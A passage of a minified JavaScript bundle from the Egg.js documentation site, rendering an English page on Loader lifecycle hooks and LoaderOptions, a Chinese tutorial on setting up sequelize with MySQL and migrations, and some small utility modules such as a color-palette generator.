icon-link"})),r.a.createElement("code",null,"ready")),r.a.createElement("p",null,"All the methods mounted on ",r.a.createElement("code",null,"ready")," will be executed when load ends, and after all the methods in ",r.a.createElement("code",null,"beforeStart")," have finished executing. By the time Http server's listening also starts. This means all the plugins are fully loaded and everything is ready, So we use it to process some tasks after start. For developers now, we use ",r.a.createElement("code",null,"didReady")," instead."),r.a.createElement("h2",{id:"beforeclose"},r.a.createElement(l["AnchorLink"],{to:"#beforeclose","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"beforeClose")),r.a.createElement("p",null,"All the methods mounted on ",r.a.createElement("code",null,"beforeClose")," are called in an inverted order after ",r.a.createElement("code",null,"close")," method in app/agent instance is called. E.g: in ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/blob/master/lib/egg.js"},r.a.createElement("code",null,"egg")),", we close logger, remove listening methods ...,ect.Developers SHOULDN'T use ",r.a.createElement("code",null,"app.beforeClose")," directly now, but in the form of class to implement ",r.a.createElement("code",null,"beforeClose")," instead."),r.a.createElement("p",null,r.a.createElement("strong",null,"We don't recommend to use this function in a PROD env, because the process may end before it finishes.")),r.a.createElement("p",null,"What's more, we can use ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-development#loader-trace"},r.a.createElement("code",null,"egg-development"))," to see the loading process."),r.a.createElement("h3",{id:"file-loading-rules"},r.a.createElement(l["AnchorLink"],{to:"#file-loading-rules","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"File-Loading Rules"),r.a.createElement("p",null,"The framework will convert file names when loading files, because there is a difference between the file naming style and the API style. We recommend that files use underscores, while APIs use lower camel case. For examplem ",r.a.createElement("code",null,"app/service/user_info.js")," will be converted to ",r.a.createElement("code",null,"app.service.userInfo"),"."),r.a.createElement("p",null,"The framework also supports hyphens and camel case:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app/service/user-info.js")," => ",r.a.createElement("code",null,"app.service.userInfo")),r.a.createElement("li",null,r.a.createElement("code",null,"app/service/userInfo.js")," => ",r.a.createElement("code",null,"app.service.userInfo"))),r.a.createElement("p",null,"Loader also provides ",r.a.createElement(l["AnchorLink"],{to:"#caseStyle-string"},"caseStyle")," to force the first letter case, such as make the first letter of the API upper case when loading the model, ",r.a.createElement("code",null,"app/model/user.js")," => ",r.a.createElement("code",null,"app.model.User"),", we can set ",r.a.createElement("code",null,"caseStyle: 'upper'"),"."),r.a.createElement("h2",{id:"extend-loader"},r.a.createElement(l["AnchorLink"],{to:"#extend-loader","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Extend Loader"),r.a.createElement("p",null,"[Loader] is a base class and provides some built-in methods based on the rules of the file loading, but itself does not call them in most cases, inherited classes call those methods."),r.a.createElement("ul",null,r.a.createElement("li",null,"loadPlugin()"),r.a.createElement("li",null,"loadConfig()"),r.a.createElement("li",null,"loadAgentExtend()"),r.a.createElement("li",null,"loadApplicationExtend()"),r.a.createElement("li",null,"loadRequestExtend()"),r.a.createElement("li",null,"loadResponseExtend()"),r.a.createElement("li",null,"loadContextExtend()"),r.a.createElement("li",null,"loadHelperExtend()"),r.a.createElement("li",null,"loadCustomAgent()"),r.a.createElement("li",null,"loadCustomApp()"),r.a.createElement("li",null,"loadService()"),r.a.createElement("li",null,"loadMiddleware()"),r.a.createElement("li",null,"loadController()"),r.a.createElement("li",null,"loadRouter()")),r.a.createElement("p",null,"Egg implements [AppWorkerLoader] and [AgentWorkerLoader] based on the Loader, inherited frameworks could make extensions based on these two classes, and ",r.a.createElement("strong",null,"Extensions of the Loader can only be done in the framework"),"."),r.a.createElement(o["a"],{code:"// custom AppWorkerLoader\n// lib/framework.js\nconst path = require('path');\nconst egg = require('egg');\nconst EGG_PATH = Symbol.for('egg#eggPath');\n\nclass YadanAppWorkerLoader extends egg.AppWorkerLoader {\n  constructor(opt) {\n    super(opt);\n    // custom initialization\n  }\n\n  loadConfig() {\n    super.loadConfig();\n    // process config\n  }\n\n  load() {\n    super.load();\n    // custom loading other directories\n    // or processing loaded files\n  }\n}\n\nclass Application extends egg.Application {\n  get [EGG_PATH]() {\n    return path.dirname(__dirname);\n  }\n  // override Egg's Loader, use this Loader when launching\n  get [EGG_LOADER]() {\n    return YadanAppWorkerLoader;\n  }\n}\n\nmodule.exports = Object.assign(egg, {\n  Application,\n  // custom Loader also need export, inherited framework make extensions based on it\n  AppWorkerLoader: YadanAppWorkerLoader,\n});",lang:"js"}),r.a.createElement("p",null,"It's convenient for development team to customize loading via the Loader supported APIs. such as ",r.a.createElement("code",null,"this.model.xx"),", ",r.a.createElement("code",null,"app/extend/filter.js")," and so on."),r.a.createElement("p",null,"The mention above is just a description of the Loader wording, please see ",r.a.createElement(l["Link"],{to:"./framework"},"Framework Development")," for details."),r.a.createElement("h2",{id:"loader-api"},r.a.createElement(l["AnchorLink"],{to:"#loader-api","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Loader API"),r.a.createElement("p",null,"Loader also supports some low level APIs to simplify code when extending, ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core#eggloader"},"here")," are all APIs."),r.a.createElement("h3",{id:"loadfile"},r.a.createElement(l["AnchorLink"],{to:"#loadfile","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"loadFile")),r.a.createElement("p",null,"Used to load a file, such as loading ",r.a.createElement("code",null,"app/xx.js"),":"),r.a.createElement(o["a"],{code:"// app/xx.js\nmodule.exports = (app) => {\n  console.log(app.config);\n};\n\n// app.js\n// app/xx.js, as an example, we could load this file in app.js\nconst path = require('path');\nmodule.exports = (app) => {\n  app.loader.loadFile(path.join(app.config.baseDir, 'app/xx.js'));\n};",lang:"js"}),r.a.createElement("p",null,"If the file exports a function, then the function will be called with ",r.a.createElement("code",null,"app")," as its parameter, otherwise uses this value directly."),r.a.createElement("h3",{id:"loadtoapp"},r.a.createElement(l["AnchorLink"],{to:"#loadtoapp","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"loadToApp")),r.a.createElement("p",null,"Used to load files from a directory into the app, such as ",r.a.createElement("code",null,"app/controller/home.js")," to ",r.a.createElement("code",null,"app.controller.home"),"."),r.a.createElement(o["a"],{code:"// app.js\n// The following is just an example, using loadController to load controller in practice\nmodule.exports = (app) => {\n  const directory = path.join(app.config.baseDir, 'app/controller');\n  app.loader.loadToApp(directory, 'controller');\n};",lang:"js"}),r.a.createElement("p",null,"The method has three parameters ",r.a.createElement("code",null,"loadToApp(directory, property, LoaderOptions)"),":"),r.a.createElement("ol",null,r.a.createElement("li",null,"Directory could be String or Array, Loader will load files in those directories."),r.a.createElement("li",null,"Property is app's property."),r.a.createElement("li",null,r.a.createElement(l["AnchorLink"],{to:"#LoaderOptions"},"LoaderOptions")," are some configurations.")),r.a.createElement("h3",{id:"loadtocontext"},r.a.createElement(l["AnchorLink"],{to:"#loadtocontext","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"loadToContext")),r.a.createElement("p",null,"The difference between loadToApp and loadToContext is that loadToContext loads files into ctx instead of app, and it's a lazy loading. It puts files into a temp object when loading, and instantiates objects when calling ctx APIs."),r.a.createElement("p",null,"We load service in this mode as an example:"),r.a.createElement(o["a"],{code:"// The following is just an example, using loadService in practice\n// app/service/user.js\nconst Service = require('egg').Service;\nclass UserService extends Service {}\nmodule.exports = UserService;\n\n// app.js\n// get all loadUnit\nconst servicePaths = app.loader\n  .getLoadUnits()\n  .map((unit) => path.join(unit.path, 'app/service'));\n\napp.loader.loadToContext(servicePaths, 'service', {\n  // service needs to inherit app.Service, so needs app as parameter\n  // enable call will return UserService when loading\n  call: true,\n  // loading file into app.serviceClasses\n  fieldClass: 'serviceClasses',\n});",lang:"js"}),r.a.createElement("p",null,r.a.createElement("code",null,"app.serviceClasses.user")," becomes UserService after file loading, it instantiates UserService when calling ",r.a.createElement("code",null,"ctx.service.user"),". So this class will only be instantiated when first calling, and will be cached after instantiation, multiple calling same request will be instantiated only once."),r.a.createElement("h3",{id:"loaderoptions"},r.a.createElement(l["AnchorLink"],{to:"#loaderoptions","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"LoaderOptions"),r.a.createElement("h4",{id:"ignore-string"},r.a.createElement(l["AnchorLink"],{to:"#ignore-string","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"ignore [String]")),r.a.createElement("p",null,r.a.createElement("code",null,"ignore")," could ignore some files, supports glob, the default is empty."),r.a.createElement(o["a"],{code:"app.loader.loadToApp(directory, 'controller', {\n  // ignore files in app/controller/util\n  ignore: 'util/**',\n});",lang:"js"}),r.a.createElement("h4",{id:"initializer-function"},r.a.createElement(l["AnchorLink"],{to:"#initializer-function","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"initializer [Function]")),r.a.createElement("p",null,"Processing each file exported values, the default is empty."),r.a.createElement(o["a"],{code:"// app/model/user.js\nmodule.exports = class User {\n  constructor(app, path) {}\n};\n\n// Loading from app/model, could do some initializations when loading.\nconst directory = path.join(app.config.baseDir, 'app/model');\napp.loader.loadToApp(directory, 'model', {\n  initializer(model, opt) {\n    // The first parameter is export's object\n    // The second parameter is an object that only contains current file path.\n    return new model(app, opt.path);\n  },\n});",lang:"js"}),r.a.createElement("h4",{id:"casestyle-string"},r.a.createElement(l["AnchorLink"],{to:"#casestyle-string","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"caseStyle [String]")),r.a.createElement("p",null,"File conversion rules, could be ",r.a.createElement("code",null,"camel"),", ",r.a.createElement("code",null,"upper"),", ",r.a.createElement("code",null,"lower"),", the default is ",r.a.createElement("code",null,"camel"),"."),r.a.createElement("p",null,"All three convert file name to camel case, but deal with the initials differently:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"camel"),": initials unchanged."),r.a.createElement("li",null,r.a.createElement("code",null,"upper"),": initials upper case."),r.a.createElement("li",null,r.a.createElement("code",null,"lower"),": initials lower case.")),r.a.createElement("p",null,"Loading different files uses different configurations:"),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"File"),r.a.createElement("th",null,"Configuration"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null,"app/controller"),r.a.createElement("td",null,"lower")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/middleware"),r.a.createElement("td",null,"lower")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/service"),r.a.createElement("td",null,"lower")))),r.a.createElement("h4",{id:"override-boolean"},r.a.createElement(l["AnchorLink"],{to:"#override-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"override [Boolean]")),r.a.createElement("p",null,"Overriding or throwing exception when encounter existing files, the default is false."),r.a.createElement("p",null,"For example, the ",r.a.createElement("code",null,"app/service/user.js")," is both loaded by the application and the plugin, if the setting is true, the application will override the plugin, otherwise an error will be throwed when loading."),r.a.createElement("p",null,"Loading different files uses different configurations:"),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"File"),r.a.createElement("th",null,"Configuration"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null,"app/controller"),r.a.createElement("td",null,"true")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/middleware"),r.a.createElement("td",null,"false")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/service"),r.a.createElement("td",null,"false")))),r.a.createElement("h4",{id:"call-boolean"},r.a.createElement(l["AnchorLink"],{to:"#call-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"call [Boolean]")),r.a.createElement("p",null,"Calling when export's object is function, and get the return value, the default is true"),r.a.createElement("p",null,"Loading different files uses different configurations:"),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"File"),r.a.createElement("th",null,"Configuration"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null,"app/controller"),r.a.createElement("td",null,"true")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/middleware"),r.a.createElement("td",null,"false")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/service"),r.a.createElement("td",null,"true")))),r.a.createElement("h2",{id:"customloader"},r.a.createElement(l["AnchorLink"],{to:"#customloader","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"CustomLoader"),r.a.createElement("p",null,"You can use ",r.a.createElement("code",null,"customLoader")," instead of ",r.a.createElement("code",null,"loadToContext")," and ",r.a.createElement("code",null,"loadToApp"),"."),r.a.createElement("p",null,"When you define a loader with ",r.a.createElement("code",null,"loadToApp")),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  const directory = path.join(app.config.baseDir, 'app/adapter');\n  app.loader.loadToApp(directory, 'adapter');\n};",lang:"js"}),r.a.createElement("p",null,"Instead, you can define ",r.a.createElement("code",null,"customLoader")),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  customLoader: {\n    // the property name when load to application, E.X. app.adapter\n    adapter: {\n      // relative to app.config.baseDir\n      directory: 'app/adapter',\n      // if inject is ctx, it will use loadToContext\n      inject: 'app',\n      // whether load the directory of the framework and plugin\n      loadunit: false,\n      // you can also use other LoaderOptions\n   }\n  },\n};\n``\n\n[Loader]: https://github.com/eggjs/egg-core/blob/master/lib/loader/egg_loader.js\n[AppWorkerLoader]: https://github.com/eggjs/egg/blob/master/lib/loader/app_worker_loader.js\n[AgentWorkerLoader]: https://github.com/eggjs/egg/blob/master/lib/loader/agent_worker_loader.js",lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(c,{demos:n})}},a9w1:function(e,t,n){"use strict";var a=n("dxz4"),r=n("uMX+");a("WeakSet",(function(e){return function(){return e(this,arguments.length?arguments[0]:void 0)}}),r)},aE1z:function(e,t,n){"use strict";var a=n("x5+g").forEach,r=n("xxe1"),l=n("hOjR"),o=r("forEach"),i=l("forEach");e.exports=o&&i?[].forEach:function(e){return a(this,e,arguments.length>1?arguments[1]:void 0)}},aGbw:function(e,t){e.exports=function(e,t){return{enumerable:!(1&e),configurable:!(2&e),writable:!(4&e),value:t}}},aH0x:function(e,t,n){"use strict";n.d(t,"a",(function(){return v}));var a=n("hUmh"),r=n("bOsn"),l=2,o=.16,i=.05,c=.05,s=.15,u=5,d=4,m=[{index:7,opacity:.15},{index:6,opacity:.25},{index:5,opacity:.3},{index:5,opacity:.45},{index:5,opacity:.65},{index:5,opacity:.85},{index:4,opacity:.9},{index:3,opacity:.95},{index:2,opacity:.97},{index:1,opacity:.98}];function p(e){var t=e.r,n=e.g,r=e.b,l=Object(a["h"])(t,n,r);return{h:360*l.h,s:l.s,v:l.v}}function h(e){var t=e.r,n=e.g,r=e.b;return"#".concat(Object(a["f"])(t,n,r,!1))}function g(e,t,n){var a=n/100,r={r:(t.r-e.r)*a+e.r,g:(t.g-e.g)*a+e.g,b:(t.b-e.b)*a+e.b};return r}function f(e,t,n){var a;return a=Math.round(e.h)>=60&&Math.round(e.h)<=240?n?Math.round(e.h)-l*t:Math.round(e.h)+l*t:n?Math.round(e.h)+l*t:Math.round(e.h)-l*t,a<0?a+=360:a>=360&&(a-=360),a}function E(e,t,n){return 0===e.h&&0===e.s?e.s:(a=n?e.s-o*t:t===d?e.s+o:e.s+i*t,a>1&&(a=1),n&&t===u&&a>.1&&(a=.1),a<.06&&(a=.06),Number(a.toFixed(2)));var a}function b(e,t,n){var a;return a=n?e.v+c*t:e.v-s*t,a>1&&(a=1),Number(a.toFixed(2))}function v(e){for(var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},n=[],a=Object(r["a"])(e),l=u;l>0;l-=1){var o=p(a),i=h(Object(r["a"])({h:f(o,l,!0),s:E(o,l,!0),v:b(o,l,!0)}));n.push(i)}n.push(h(a));for(var c=1;c<=d;c+=1){var s=p(a),v=h(Object(r["a"])({h:f(s,c),s:E(s,c),v:b(s,c)}));n.push(v)}return"dark"===t.theme?m.map((function(e){var a=e.index,l=e.opacity,o=h(g(Object(r["a"])(t.backgroundColor||"#141414"),Object(r["a"])(n[a]),100*l));return o})):n}var y={red:"#F5222D",volcano:"#FA541C",orange:"#FA8C16",gold:"#FAAD14",yellow:"#FADB14",lime:"#A0D911",green:"#52C41A",cyan:"#13C2C2",blue:"#1890FF",geekblue:"#2F54EB",purple:"#722ED1",magenta:"#EB2F96",grey:"#666666"},k={},w={};Object.keys(y).forEach((function(e){k[e]=v(y[e]),k[e].primary=k[e][5],w[e]=v(y[e],{theme:"dark",backgroundColor:"#141414"}),w[e].primary=w[e][5]}));k.red,k.volcano,k.gold,k.orange,k.yellow,k.lime,k.green,k.cyan,k.blue,k.geekblue,k.purple,k.magenta,k.grey},aXUZ:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"./mysql"},"\u524d\u9762\u7684\u7ae0\u8282\u4e2d"),"\uff0c\u6211\u4eec\u4ecb\u7ecd\u4e86\u5982\u4f55\u5728\u6846\u67b6\u4e2d\u901a\u8fc7 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mysql"},"egg-mysql")," \u63d2\u4ef6\u6765\u8bbf\u95ee\u6570\u636e\u5e93\u3002\u800c\u5728\u4e00\u4e9b\u8f83\u4e3a\u590d\u6742\u7684\u5e94\u7528\u4e2d\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u9700\u8981\u4e00\u4e2a ORM \u6846\u67b6\u6765\u5e2e\u52a9\u6211\u4eec\u7ba1\u7406\u6570\u636e\u5c42\u7684\u4ee3\u7801\u3002\u800c\u5728 Node.js \u793e\u533a\u4e2d\uff0c",r.a.createElement(l["Link"],{to:"http://docs.sequelizejs.com/"},"sequelize")," \u662f\u4e00\u4e2a\u5e7f\u6cdb\u4f7f\u7528\u7684 ORM \u6846\u67b6\uff0c\u5b83\u652f\u6301 MySQL\u3001PostgreSQL\u3001SQLite \u548c MSSQL \u7b49\u591a\u4e2a\u6570\u636e\u6e90\u3002"),r.a.createElement("p",null,"\u672c\u7ae0\u8282\u6211\u4eec\u4f1a\u901a\u8fc7\u5f00\u53d1\u4e00\u4e2a\u5bf9 MySQL \u4e2d ",r.a.createElement("code",null,"users")," \u8868\u7684\u6570\u636e\u505a CURD \u7684\u4f8b\u5b50\u6765\u4e00\u6b65\u6b65\u4ecb\u7ecd\u5982\u4f55\u5728 egg \u9879\u76ee\u4e2d\u4f7f\u7528 sequelize\u3002"),r.a.createElement("h2",{id:"\u51c6\u5907\u5de5\u4f5c"},r.a.createElement(l["AnchorLink"],{to:"#\u51c6\u5907\u5de5\u4f5c","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u51c6\u5907\u5de5\u4f5c"),r.a.createElement("p",null,"\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528 sequelize \u8fde\u63a5\u5230 MySQL \u6570\u636e\u6e90\uff0c\u56e0\u6b64\u5728\u5f00\u59cb\u7f16\u5199\u4ee3\u7801\u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u5148\u5728\u672c\u673a\u4e0a\u5b89\u88c5\u597d MySQL\uff0c\u5982\u679c\u662f MacOS\uff0c\u53ef\u4ee5\u901a\u8fc7 homebrew \u5feb\u901f\u5b89\u88c5\uff1a"),r.a.createElement(o["a"],{code:"brew install mysql\nbrew services start mysql",lang:"bash"}),r.a.createElement("h2",{id:"\u521d\u59cb\u5316\u9879\u76ee"},r.a.createElement(l["AnchorLink"],{to:"#\u521d\u59cb\u5316\u9879\u76ee","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u521d\u59cb\u5316\u9879\u76ee"),r.a.createElement("p",null,"\u901a\u8fc7 ",r.a.createElement("code",null,"npm")," \u521d\u59cb\u5316\u4e00\u4e2a\u9879\u76ee:"),r.a.createElement(o["a"],{code:"$ mkdir sequelize-project && cd sequelize-project\n$ npm init egg --type=simple\n$ npm i",lang:"bash"}),r.a.createElement("p",null,"\u5b89\u88c5\u5e76\u914d\u7f6e ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-sequelize"},"egg-sequelize")," \u63d2\u4ef6\uff08\u5b83\u4f1a\u8f85\u52a9\u6211\u4eec\u5c06\u5b9a\u4e49\u597d\u7684 Model \u5bf9\u8c61\u52a0\u8f7d\u5230 app \u548c ctx \u4e0a\uff09\u548c ",r.a.createElement(l["Link"],{to:"https://github.com/sidorares/node-mysql2"},"mysql2")," \u6a21\u5757\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5b89\u88c5")),r.a.createElement(o["a"],{code:"npm install --save egg-sequelize mysql2",lang:"bash"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5728 ",r.a.createElement("code",null,"config/plugin.js")," \u4e2d\u5f15\u5165 egg-sequelize \u63d2\u4ef6")),r.a.createElement(o["a"],{code:"exports.sequelize = {\n  enable: true,\n  package: 'egg-sequelize',\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5728 ",r.a.createElement("code",null,"config/config.default.js")," \u4e2d\u7f16\u5199 sequelize \u914d\u7f6e")),r.a.createElement(o["a"],{code:"exports.sequelize = {\n  dialect: 'mysql',\n  host: '127.0.0.1',\n  port: 3306,\n  database: 'egg-sequelize-doc-default',\n};",lang:"js"}),r.a.createElement("p",null,"\u6211\u4eec\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u73af\u5883\u914d\u7f6e\u4e2d\u914d\u7f6e\u4e0d\u540c\u7684\u6570\u636e\u6e90\u5730\u5740\uff0c\u7528\u4e8e\u533a\u5206\u4e0d\u540c\u73af\u5883\u4f7f\u7528\u7684\u6570\u636e\u5e93\uff0c\u4f8b\u5982\u6211\u4eec\u53ef\u4ee5\u65b0\u5efa\u4e00\u4e2a ",r.a.createElement("code",null,"config/config.unittest.js")," \u914d\u7f6e\u6587\u4ef6\uff0c\u5199\u5165\u5982\u4e0b\u914d\u7f6e\uff0c\u5c06\u5355\u6d4b\u65f6\u8fde\u63a5\u7684\u6570\u636e\u5e93\u6307\u5411 ",r.a.createElement("code",null,"egg-sequelize-doc-unittest"),"\u3002"),r.a.createElement(o["a"],{code:"exports.sequelize = {\n  dialect: 'mysql',\n  host: '127.0.0.1',\n  port: 3306,\n  database: 'egg-sequelize-doc-unittest',\n};",lang:"js"}),r.a.createElement("p",null,"\u5b8c\u6210\u4e0a\u9762\u7684\u914d\u7f6e\u4e4b\u540e\uff0c\u4e00\u4e2a\u4f7f\u7528 sequelize \u7684\u9879\u76ee\u5c31\u521d\u59cb\u5316\u5b8c\u6210\u4e86\u3002",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-sequelize"},"egg-sequelize")," \u548c ",r.a.createElement(l["Link"],{to:"http://docs.sequelizejs.com/"},"sequelize")," \u8fd8\u652f\u6301\u66f4\u591a\u7684\u914d\u7f6e\u9879\uff0c\u53ef\u4ee5\u5728\u4ed6\u4eec\u7684\u6587\u6863\u4e2d\u627e\u5230\u3002"),r.a.createElement("h2",{id:"\u521d\u59cb\u5316\u6570\u636e\u5e93\u548c-migrations"},r.a.createElement(l["AnchorLink"],{to:"#\u521d\u59cb\u5316\u6570\u636e\u5e93\u548c-migrations","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u521d\u59cb\u5316\u6570\u636e\u5e93\u548c Migrations"),r.a.createElement("p",null,"\u63a5\u4e0b\u6765\u6211\u4eec\u5148\u6682\u65f6\u79bb\u5f00 egg \u9879\u76ee\u7684\u4ee3\u7801\uff0c\u8bbe\u8ba1\u548c\u521d\u59cb\u5316\u4e00\u4e0b\u6211\u4eec\u7684\u6570\u636e\u5e93\u3002\u9996\u5148\u6211\u4eec\u901a\u8fc7 mysql \u547d\u4ee4\u5728\u672c\u5730\u5feb\u901f\u521b\u5efa\u5f00\u53d1\u548c\u6d4b\u8bd5\u8981\u7528\u5230\u7684\u4e24\u4e2a database\uff1a"),r.a.createElement(o["a"],{code:"mysql -u root -e 'CREATE DATABASE IF NOT EXISTS `egg-sequelize-doc-default`;'\nmysql -u root -e 'CREATE DATABASE IF NOT EXISTS `egg-sequelize-doc-unittest`;'",lang:"bash"}),r.a.createElement("p",null,"\u7136\u540e\u6211\u4eec\u5f00\u59cb\u8bbe\u8ba1 ",r.a.createElement("code",null,"users")," \u8868\uff0c\u5b83\u6709\u5982\u4e0b\u7684\u6570\u636e\u7ed3\u6784\uff1a"),r.a.createElement(o["a"],{code:"CREATE TABLE `users` (\n  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'primary key',\n  `name` varchar(30) DEFAULT NULL COMMENT 'user name',\n  `age` int(11) DEFAULT NULL COMMENT 'user age',\n  `created_at` datetime DEFAULT NULL COMMENT 'created time',\n  `updated_at` datetime DEFAULT NULL COMMENT 'updated time',\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='user';",lang:"sql"}),r.a.createElement("p",null,"\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 mysql \u547d\u4ee4\u5c06\u8868\u76f4\u63a5\u5efa\u597d\uff0c\u4f46\u662f\u8fd9\u5e76\u4e0d\u662f\u4e00\u4e2a\u5bf9\u591a\u4eba\u534f\u4f5c\u975e\u5e38\u53cb\u597d\u7684\u5f00\u53d1\u6a21\u5f0f\u3002\u5728\u9879\u76ee\u7684\u6f14\u8fdb\u8fc7\u7a0b\u4e2d\uff0c\u6bcf\u4e00\u4e2a\u8fed\u4ee3\u90fd\u6709\u53ef\u80fd\u5bf9\u6570\u636e\u5e93\u6570\u636e\u7ed3\u6784\u505a\u53d8\u66f4\uff0c\u600e\u6837\u8ddf\u8e2a\u6bcf\u4e00\u4e2a\u8fed\u4ee3\u7684\u6570\u636e\u53d8\u66f4\uff0c\u5e76\u5728\u4e0d\u540c\u7684\u73af\u5883\uff08\u5f00\u53d1\u3001\u6d4b\u8bd5\u3001CI\uff09\u548c\u8fed\u4ee3\u5207\u6362\u4e2d\uff0c\u5feb\u901f\u53d8\u66f4\u6570\u636e\u7ed3\u6784\u5462\uff1f\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981 ",r.a.createElement(l["Link"],{to:"http://docs.sequelizejs.com/manual/tutorial/migrations.html"},"Migrations")," \u6765\u5e2e\u6211\u4eec\u7ba1\u7406\u6570\u636e\u7ed3\u6784\u7684\u53d8\u66f4\u4e86\u3002"),r.a.createElement("p",null,"sequelize \u63d0\u4f9b\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/sequelize/cli"},"sequelize-cli")," \u5de5\u5177\u6765\u5b9e\u73b0 ",r.a.createElement(l["Link"],{to:"http://docs.sequelizejs.com/manual/tutorial/migrations.html"},"Migrations"),"\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5728 egg \u9879\u76ee\u4e2d\u5f15\u5165 sequelize-cli\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5b89\u88c5 sequelize-cli")),r.a.createElement(o["a"],{code:"npm install --save-dev sequelize-cli",lang:"bash"}),r.a.createElement("p",null,"\u5728 egg \u9879\u76ee\u4e2d\uff0c\u6211\u4eec\u5e0c\u671b\u5c06\u6240\u6709\u6570\u636e\u5e93 Migrations \u76f8\u5173\u7684\u5185\u5bb9\u90fd\u653e\u5728 ",r.a.createElement("code",null,"database")," \u76ee\u5f55\u4e0b\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u9879\u76ee\u6839\u76ee\u5f55\u4e0b\u65b0\u5efa\u4e00\u4e2a ",r.a.createElement("code",null,".sequelizerc")," \u914d\u7f6e\u6587\u4ef6\uff1a"),r.a.createElement(o["a"],{code:"'use strict';\n\nconst path = require('path');\n\nmodule.exports = {\n  config: path.join(__dirname, 'database/config.json'),\n  'migrations-path': path.join(__dirname, 'database/migrations'),\n  'seeders-path': path.join(__dirname, 'database/seeders'),\n  'models-path': path.join(__dirname, 'app/model'),\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u521d\u59cb\u5316 Migrations \u914d\u7f6e\u6587\u4ef6\u548c\u76ee\u5f55")),r.a.createElement(o["a"],{code:"npx sequelize init:config\nnpx sequelize init:migrations",lang:"bash"}),r.a.createElement("p",null,"\u6267\u884c\u5b8c\u540e\u4f1a\u751f\u6210 ",r.a.createElement("code",null,"database/config.json")," \u6587\u4ef6\u548c ",r.a.createElement("code",null,"database/migrations")," \u76ee\u5f55\uff0c\u6211\u4eec\u4fee\u6539\u4e00\u4e0b ",r.a.createElement("code",null,"database/config.json")," 